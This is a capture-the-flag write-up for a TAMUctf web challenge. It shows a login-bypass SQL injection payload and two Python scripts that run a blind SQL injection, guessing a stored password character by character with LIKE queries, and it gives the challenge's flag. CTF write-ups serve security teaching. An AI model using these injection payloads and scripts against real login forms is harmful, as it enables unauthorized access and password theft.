# Password Extraction

## Description

> The owner of this website often reuses passwords. Can you find out the password they are using on this test server?
> 
> http://passwordextraction.tamuctf.com
> 
> You do not need to use brute force for this challenge.

The website is a simple login form.

## Solution

The simple SQL injection works: `username: admin`, `password: x' OR '1'='1`. We can log in, but we get the message:
```
You've successfully authorized, but that doesn't get you the password.
```

So let's do a blind SQL injection: we want to guess the password character by character using injections of the type `x' OR password LIKE gigem{knownpassword%`. Trying with `gigem{` at the beginning, this works, so let's script it.

First let's retrieve the characters used in password:

```python
import requests

url = 'http://passwordextraction.tamuctf.com/login.php'
post_data = {'username': 'admin', 'password': "x' or '1'='1"}

valid_char = []

for i in range(33,127):
    c = chr(i)
    # Escape special chars
    if c in ',&?{}()[]-;~|$!>*%_' or i == 92:
        c = chr(92) + c
    post_data['password'] = "' OR password LIKE '%" + c + "%"
    print(post_data)
    x = requests.post(url, data = post_data)
    print(x.text)
    if 'successfully' in x.text:
        valid_char.append(c)
print(valid_char)
```

Then we perform the actual search

```python
while(True):
    for c in '01STYcdeghimoprstu':
        post_data['password'] = "' OR password LIKE '%" + valid + c + "%"
        x = requests.post(url, data = post_data)
        if 'successfully' in x.text:
            valid = valid + c
            print(valid)
            break
```

Flag: `gigem{h0peYouScr1ptedTh1s}`